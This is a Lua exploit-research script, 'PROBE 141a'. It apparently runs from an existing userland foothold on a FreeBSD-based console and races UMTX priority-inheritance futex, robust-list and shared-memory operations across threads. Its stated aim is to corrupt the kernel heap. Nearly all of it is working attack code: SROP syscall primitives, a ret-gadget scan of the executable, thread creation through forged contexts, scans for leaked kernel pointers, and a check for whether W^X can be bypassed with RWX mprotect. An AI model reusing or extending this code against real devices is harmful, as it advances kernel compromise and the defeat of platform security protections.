-- CRASH_CLASS: MODERATE
-- PROBE 141a: UMTX PI futex race — kernel heap corruption attempt
--
-- Strategy: Use threads to race on PI (Priority Inheritance) futex operations.
-- UMTX_OP_LOCK_PI(12) and UMTX_OP_UNLOCK_PI(13) create kernel umtx_pi structures
-- that track thread ownership. Racing lock/unlock with thread exit can create
-- dangling kernel references (CVE patterns from FreeBSD UMTX bugs).
--
-- Also test: UMTX_OP_SET_CEILING(15) — PI ceiling operations modify kernel objects.
-- And UMTX_OP_SHM(25) — shared memory handles through umtx.
--
-- Goal: Cause kernel heap corruption that we can detect via side effects
-- (changed behavior, new accessible memory, or crashes we survive).

print("=== PROBE 141a: UMTX PI RACE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local rip = memory.read_qword(ctx + MC + 0xA0)
local rh2, rl2 = get_hi_lo(rip)
local sc_addr = uint64(string.format("0x%X%08X", rh2, rl2 - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    memory.write_qword(ctx + MC + 0xA0, sc_addr)
    memory.write_qword(ctx + MC + 0x38, uint64(num))
    if a1 then memory.write_qword(ctx + MC + 0x08, a1) end
    if a2 then memory.write_qword(ctx + MC + 0x10, a2) end
    if a3 then memory.write_qword(ctx + MC + 0x18, a3) end
    if a4 then memory.write_qword(ctx + MC + 0x50, a4) end
    if a5 then memory.write_qword(ctx + MC + 0x28, a5) end
    if a6 then memory.write_qword(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x80000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))
local function ua(v) return uint64(string.format("0x%X", to_num(v))) end
local function zero(addr, len)
    for off = 0, len - 1, 4 do memory.write_dword(addr + off, 0) end
end
local kfound = 0

-- Get eboot base for thread entry gadgets
local info = memory.alloc(0x200)
memory.write_dword(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), info) end)
local eb_lo = to_num(memory.read_dword(info + 0x108))
local eb_hi = to_num(memory.read_dword(info + 0x10C))
local eboot = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
print("eboot=" .. hex(eboot))

-- Find ret gadget in eboot
local ret_gadget = nil
for off = 0, 0x1000 do
    local ok, b = pcall(function() return memory.read_byte(to_num(eboot) + off) end)
    if ok and to_num(b) == 0xC3 then
        ret_gadget = uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
        break
    end
end
print("ret=" .. hex(ret_gadget))

--------------------------------------------------------------------
-- A: UMTX_OP_LOCK_PI(12) / UNLOCK_PI(13) basic test
-- These create kernel umtx_pi structures
--------------------------------------------------------------------
print("")
print("--- [A] UMTX PI basic ---")
local futex = gpu + 0x10000  -- PI futex word
zero(futex, 8)

-- UMTX_OP_LOCK_PI = 12, UMTX_OP_UNLOCK_PI = 13
-- obj=futex, op=12, val=0 (try-lock with zero timeout)
-- For PI lock, val is the thread ID that owns it
-- Let's set the futex to unowned (0) first
memory.write_dword(futex, 0)

-- Try to acquire the PI lock
local rv_lock = srop(454, ua(futex), uint64(12), uint64(0), uint64(0), uint64(0))
local lh, ll = get_hi_lo(rv_lock)
print("[A] LOCK_PI ret=" .. hex(rv_lock))
local futex_val = to_num(memory.read_dword(futex))
print("[A] futex val after lock=" .. string.format("0x%X", futex_val))

if ll == 0 and lh == 0 then
    print("[A] PI lock ACQUIRED!")
    -- The futex should now contain our TID
    -- Try to unlock
    local rv_unlock = srop(454, ua(futex), uint64(13), uint64(0), uint64(0), uint64(0))
    print("[A] UNLOCK_PI ret=" .. hex(rv_unlock))
    local futex_val2 = to_num(memory.read_dword(futex))
    print("[A] futex val after unlock=" .. string.format("0x%X", futex_val2))
end

-- Check for kernel pointer residue around the futex
for off = -0x40, 0x40, 8 do
    local v = safe_rq(futex + off)
    if v then
        local vh, vl = get_hi_lo(v)
        if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
            kfound = kfound + 1
            print(string.format("[A] *** KPTR futex%+d: %s ***", off, hex(v)))
        end
    end
end
print("[A] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- B: UMTX_OP_SHM(25) — kernel shared memory via umtx
-- On FreeBSD 11, this creates a kernel-managed shared memory object
-- accessible via umtx_op. Key from uaddr1.
--------------------------------------------------------------------
print("")
print("--- [B] UMTX_OP_SHM ---")
-- UMTX_OP_SHM = 25
-- Sub-operations via val:
-- UMTX_SHM_CREAT=1, UMTX_SHM_LOOKUP=2, UMTX_SHM_DESTROY=3, UMTX_SHM_ALIVE=4
local shm_key = gpu + 0x11000
zero(shm_key, 0x100)
memory.write_dword(shm_key, 0x12345678)  -- arbitrary key

for _, sub in ipairs({
    {name="CREAT", val=1},
    {name="LOOKUP", val=2},
    {name="ALIVE", val=4},
}) do
    local rv = srop(454, ua(shm_key), uint64(25), uint64(sub.val), uint64(0), uint64(0))
    local rvh, rvl = get_hi_lo(rv)
    print(string.format("[B] SHM_%s ret=%s", sub.name, hex(rv)))
    if rvl == 0 and rvh == 0 then
        print(string.format("[B] *** SHM_%s WORKS! ***", sub.name))
        -- Check if kernel wrote anything near shm_key
        for off = 0, 0x40, 8 do
            local v = safe_rq(shm_key + off)
            if v then
                local vh, vl = get_hi_lo(v)
                if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                    kfound = kfound + 1
                    print(string.format("[B] *** KPTR shm_key+0x%X: %s ***", off, hex(v)))
                end
            end
        end
    end
end
print("[B] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- C: UMTX_OP_ROBUST_LISTS(26) — register robust futex list
-- On FreeBSD 11+, this registers a robust futex list pointer
-- The kernel stores this pointer and accesses it when the thread exits
-- This could be used to make the kernel write to an arbitrary address!
--------------------------------------------------------------------
print("")
print("--- [C] UMTX robust list ---")
-- struct umtx_robust_lists_params {
--   uintptr_t robust_list_offset;  // +0x00
--   uintptr_t robust_priv_list_offset; // +0x08
--   uintptr_t robust_inact_offset; // +0x10
-- };
local robust_buf = gpu + 0x12000
zero(robust_buf, 0x100)
-- Set up robust list pointers to point to our GPU mmap area
local robust_list = gpu + 0x13000
zero(robust_list, 0x100)
-- Head of the robust list (list_op_pending, futex_offset, etc.)
-- struct robust_list_head {
--   struct robust_list list;  // head pointer
--   long futex_offset;        // offset from list entry to futex word
--   struct robust_list *list_op_pending; // currently being modified
-- };
memory.write_qword(robust_list, ua(robust_list))  -- list points to itself (empty)
memory.write_qword(robust_list + 8, uint64(0))    -- futex_offset = 0
memory.write_qword(robust_list + 16, uint64(0))   -- list_op_pending = NULL

-- Register the robust list
-- uaddr1 = params struct, val = sizeof(params)
memory.write_qword(robust_buf, ua(robust_list))     -- robust_list_offset
memory.write_qword(robust_buf + 8, ua(robust_list)) -- robust_priv_list_offset
memory.write_qword(robust_buf + 16, uint64(0))      -- robust_inact_offset

local rv_robust = srop(454, ua(robust_buf), uint64(26), uint64(0x18), uint64(0), uint64(0))
local roh, rol = get_hi_lo(rv_robust)
print("[C] ROBUST_LISTS ret=" .. hex(rv_robust))
if rol == 0 and roh == 0 then
    print("[C] *** ROBUST LIST REGISTERED! ***")
    -- Now if we create a thread that exits while holding a PI lock,
    -- the kernel will walk the robust list and unlock the futex
    -- This could leak kernel state or give us an arbitrary write

    -- Create a PI futex
    local race_futex = gpu + 0x14000
    memory.write_dword(race_futex, 0)

    -- Lock it (main thread)
    local rv_lk = srop(454, ua(race_futex), uint64(12), uint64(0), uint64(0), uint64(0))
    print("[C] PI lock=" .. hex(rv_lk))
    local fv = to_num(memory.read_dword(race_futex))
    print("[C] futex val=" .. string.format("0x%X", fv))

    -- Check robust list for kernel writes
    for off = 0, 0x40, 8 do
        local v = safe_rq(robust_list + off)
        if v then
            local vh, vl = get_hi_lo(v)
            if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                kfound = kfound + 1
                print(string.format("[C] *** KPTR robust+0x%X: %s ***", off, hex(v)))
            end
            if (vh > 0 or vl > 0) and off >= 24 then
                print(string.format("[C] robust+0x%X: %s", off, hex(v)))
            end
        end
    end

    -- Unlock
    srop(454, ua(race_futex), uint64(13), uint64(0), uint64(0), uint64(0))
end
print("[C] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- D: Thread-based PI futex contention
-- Create threads that fight over a PI lock.
-- Thread entry: SROP chain that does LOCK_PI then thr_exit
-- Main thread: rapidly does LOCK_PI/UNLOCK_PI on same futex
--------------------------------------------------------------------
print("")
print("--- [D] Thread PI contention ---")
local contest_futex = gpu + 0x15000
memory.write_dword(contest_futex, 0)

-- Thread will: lock the PI futex via SROP, then exit
-- We create the thread with SROP entry to syscall(454, futex, 12, 0, 0, 0)
-- followed by thr_exit(431)
local tctx = memory.alloc(0x500)
local tstack = gpu + 0x20000  -- thread stack area

-- Create 5 contending threads
local tids = {}
for i = 1, 5 do
    pcall(function() return sc_gc(uint64(tctx)) end)
    -- Thread entry: try LOCK_PI on the contest futex (non-blocking)
    -- Then exit via ret sled → thr_exit
    memory.write_qword(tctx + MC + 0xA0, sc_addr)  -- RIP = syscall gadget
    memory.write_qword(tctx + MC + 0x38, uint64(454))  -- RAX = umtx_op
    memory.write_qword(tctx + MC + 0x08, ua(contest_futex))  -- RDI = obj
    memory.write_qword(tctx + MC + 0x10, uint64(12))  -- RSI = UMTX_OP_LOCK_PI
    memory.write_qword(tctx + MC + 0x18, uint64(0))  -- RDX = 0
    memory.write_qword(tctx + MC + 0x50, uint64(0))  -- R10 = 0
    memory.write_qword(tctx + MC + 0x28, uint64(0))  -- R8 = 0
    memory.write_qword(tctx + MC + 0xB8, ua(tstack + i * 0x1000))  -- RSP
    -- CS/SS must be set correctly
    memory.write_dword(tctx + MC + 0x98, 0x43)  -- CS
    memory.write_dword(tctx + MC + 0xB0, 0x3B)  -- SS

    local tid_buf = gpu + 0x16000 + i * 8
    memory.write_qword(tid_buf, uint64(0))

    local rv_tc = srop(430, ua(tctx), uint64(0x500), ua(tid_buf), uint64(0), uint64(0))
    local tch, tcl = get_hi_lo(rv_tc)
    local tid = safe_rq(tid_buf)
    local th, tl = 0, 0
    if tid then th, tl = get_hi_lo(tid) end

    if tcl == 0 and tch == 0 and tl > 0 then
        tids[#tids + 1] = tl
        print(string.format("[D] thread %d: tid=%d", i, tl))
    else
        print(string.format("[D] thread %d: FAIL rv=%s", i, hex(rv_tc)))
    end
end

-- Wait a moment then check futex state
local fv = to_num(memory.read_dword(contest_futex))
print("[D] futex val=" .. string.format("0x%X", fv))

-- Try to lock the futex ourselves (main thread)
local rv_ml = srop(454, ua(contest_futex), uint64(12), uint64(0), uint64(0), uint64(0))
print("[D] main lock=" .. hex(rv_ml))
fv = to_num(memory.read_dword(contest_futex))
print("[D] futex after main lock=" .. string.format("0x%X", fv))

-- Scan area around futex for kernel residue
for off = -0x100, 0x100, 8 do
    local v = safe_rq(contest_futex + off)
    if v then
        local vh, vl = get_hi_lo(v)
        if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
            kfound = kfound + 1
            print(string.format("[D] *** KPTR futex%+d: %s ***", off, hex(v)))
        end
    end
end

-- Kill threads
for _, tid in ipairs(tids) do
    srop(433, uint64(tid), uint64(9))
end

-- Unlock
srop(454, ua(contest_futex), uint64(13), uint64(0), uint64(0), uint64(0))
print("[D] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- E: Post-race kernel state check
-- After all the futex contention, check if any kernel state leaked
-- via sysctl or other accessible channels
--------------------------------------------------------------------
print("")
print("--- [E] Post-race state ---")
-- Check kern.features again
local mib = gpu + 0x17000
local outbuf = gpu + 0x18000
local oldlenp = gpu + 0x17F00
memory.write_dword(mib, 1)
memory.write_dword(mib + 4, 38) -- kern.features
zero(outbuf, 0x100)
memory.write_dword(oldlenp, 0x100)
memory.write_dword(oldlenp + 4, 0)
local rv_kf = srop(202, ua(mib), uint64(2), ua(outbuf), ua(oldlenp), uint64(0), uint64(0))
local kf_val = safe_rq(outbuf)
print("[E] kern.features=" .. (kf_val and hex(kf_val) or "nil"))

-- Check if mprotect(RWX) works now (corruption might disable W^X)
local test_page = srop(477, uint64(0), uint64(0x4000), uint64(3),
    uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
local tph, tpl = get_hi_lo(test_page)
if tpl > 0 and tph < 0x80000000 then
    local rv_mp = srop(74, test_page, uint64(0x4000), uint64(7))
    print("[E] mprotect(RWX) after race=" .. hex(rv_mp))
    srop(73, test_page, uint64(0x4000))
end

print("[E] pid=" .. to_num(sc20()))
print("")
print("TOTAL kptrs=" .. kfound)
print("pid=" .. to_num(sc20()))
print("=== DONE ===")
